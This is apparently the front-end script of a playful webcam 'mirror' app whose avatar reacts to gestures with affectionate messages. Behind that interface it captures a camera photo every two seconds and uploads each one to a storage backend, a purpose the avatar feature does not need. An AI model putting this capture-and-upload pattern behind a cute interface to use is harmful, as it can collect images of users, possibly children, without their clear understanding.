(function () {
  const $ = id => document.getElementById(id);
  const state = {
    lastAction: "low_movement",
    animation: "smile",
    captureTimer: null,
    uploadQueue: [],
    isUploading: false,
    gifFailed: false
  };

  const video = $("camera-video");
  const canvas = $("capture-canvas");
  const ctx = canvas.getContext("2d");

  const labels = {
    wave: "I’m waving back at you ♡",
    dance: "You’re my little superstar ✦",
    heart_shape: "A heart for my heart ♡",
    talking: "I love listening to you ✨",
    low_movement: "I’m here with you ♡"
  };

  const animationKeys = {
    wave: "wave",
    dance: "dance",
    heart_shape: "heart",
    talking: "talk",
    low_movement: "smile"
  };

  // Switch cute animated GIF reaction
  function switchReactionVisuals(animName) {
    const gifImg = $("gif-character");
    if (gifImg && !state.gifFailed) {
      const nextSrc = `./assets/${animName}.gif`;
      if (!gifImg.src.endsWith(nextSrc.replace("./", "/"))) {
        gifImg.src = nextSrc;
        gifImg.classList.remove("pop-anim");
        void gifImg.offsetWidth; // trigger reflow
        gifImg.classList.add("pop-anim");
      }
    }

    // CSS Avatar fallback
    const avatar = $("avatar");
    if (avatar) {
      avatar.className = `avatar avatar-${animName}`;
    }
  }

  function setReaction(action) {
    if (action === state.lastAction && state.lastActionTime && Date.now() - state.lastActionTime < 1400) {
      return;
    }
    state.lastAction = action;
    state.lastActionTime = Date.now();
    state.animation = animationKeys[action] || "smile";

    switchReactionVisuals(state.animation);

    // Update text and bubbles
    $("action-label").textContent = labels[action] || labels.low_movement;
    $("speech-bubble").hidden = action !== "talking";

    if (action === "wave" || action === "dance" || action === "heart_shape") {
      burst(action === "heart_shape" ? "♥" : action === "dance" ? "✦" : "♡");
    }
  }

  function burst(symbol) {
    const wrap = $("reaction-burst");
    if (!wrap) return;
    wrap.innerHTML = "";
    for (let i = 0; i < 7; i++) {
      const item = document.createElement("span");
      item.className = "burst-item";
      item.textContent = symbol;
      item.style.left = `${35 + Math.random() * 30}%`;
      item.style.top = `${35 + Math.random() * 20}%`;
      item.style.setProperty("--x", `${(Math.random() - 0.5) * 180}px`);
      item.style.setProperty("--y", `${-40 - Math.random() * 130}px`);
      item.style.animationDelay = `${i * 0.07}s`;
      wrap.appendChild(item);
    }
  }

  // Upload queue: uploads photos smoothly in background without blocking capture interval
  async function processUploadQueue() {
    if (state.isUploading || state.uploadQueue.length === 0) return;
    state.isUploading = true;

    const item = state.uploadQueue.shift();
    const indicator = $("recording-indicator");
    if (indicator) {
      indicator.hidden = false;
      indicator.classList.add("pulse-fast");
    }

    try {
      await window.mirrorStore.save(item.blob, "photo", {
        detectedAction: item.action,
        animationShown: item.animation
      });
    } catch (error) {
      console.error("[Mirror] Photo upload error:", error);
    } finally {
      state.isUploading = false;
      if (indicator) {
        indicator.classList.remove("pulse-fast");
        if (state.uploadQueue.length === 0) {
          setTimeout(() => {
            if (!state.isUploading && state.uploadQueue.length === 0) {
              indicator.hidden = true;
            }
          }, 800);
        }
      }
      if (state.uploadQueue.length > 0) {
        processUploadQueue();
      }
    }
  }

  function enqueuePhoto(blob, action, animation) {
    // Keep max 5 items in queue to prevent memory build-up if network is slow
    if (state.uploadQueue.length >= 5) {
      state.uploadQueue.shift();
    }
    state.uploadQueue.push({ blob, action, animation });
    processUploadQueue();
  }

  // Captures photo every 2 seconds
  function capturePhoto() {
    if (!video || video.readyState < 2 || video.paused || video.ended) {
      return;
    }

    try {
      const vw = video.videoWidth || 1280;
      const vh = video.videoHeight || 720;
      if (canvas.width !== vw) canvas.width = vw;
      if (canvas.height !== vh) canvas.height = vh;

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      if (canvas.toBlob) {
        canvas.toBlob(blob => {
          if (blob) enqueuePhoto(blob, state.lastAction, state.animation);
        }, "image/jpeg", 0.88);
      } else {
        const dataUrl = canvas.toDataURL("image/jpeg", 0.88);
        fetch(dataUrl)
          .then(res => res.blob())
          .then(blob => enqueuePhoto(blob, state.lastAction, state.animation));
      }
    } catch (err) {
      console.warn("[Mirror] Frame capture exception:", err);
    }
  }

  function handleDetection(result) {
    if (result && result.action) {
      setReaction(result.action);
    }
  }

  async function start() {
    const startBtn = $("start-button");
    const errorBox = $("consent-error");
    startBtn.disabled = true;
    errorBox.hidden = true;

    try {
      // iOS Safari and mobile-friendly constraints (audio not required for photos)
      const constraints = {
        video: {
          width: { ideal: 1280 },
          height: { ideal: 720 },
          facingMode: "user"
        },
        audio: false
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = stream;
      video.setAttribute("playsinline", "true");
      video.setAttribute("webkit-playsinline", "true");
      video.muted = true;
      await video.play();

      $("consent-screen").hidden = true;
      $("experience").hidden = false;

      // Handle GIF error fallback to CSS avatar
      const gifImg = $("gif-character");
      if (gifImg) {
        gifImg.onerror = () => {
          state.gifFailed = true;
          gifImg.style.display = "none";
          const av = $("avatar");
          if (av) av.style.display = "block";
        };
      }

      // Start MediaPipe detection loop on incoming camera frames
      const detector = new MirrorDetector(video, handleDetection);
      let isDetecting = false;
      const detectLoop = async () => {
        if (!video.paused && !video.ended && video.readyState >= 2) {
          if (!isDetecting) {
            isDetecting = true;
            try {
              await detector.process();
            } catch (_) {}
            isDetecting = false;
          }
        }
        requestAnimationFrame(detectLoop);
      };
      requestAnimationFrame(detectLoop);

      // Take photo every 2 seconds (2000 ms)
      capturePhoto();
      state.captureTimer = setInterval(capturePhoto, 2000);
    } catch (error) {
      console.error("Camera access error:", error);
      startBtn.disabled = false;
      const message = error.name === "NotAllowedError"
        ? "Camera permission nahi mili. Browser settings mein permission allow karke phir try karein ♡"
        : "Camera start nahi ho paaya. Please HTTPS connection par dobara try karein.";
      errorBox.textContent = message;
      errorBox.hidden = false;
    }
  }

  $("start-button").addEventListener("click", start);
})();
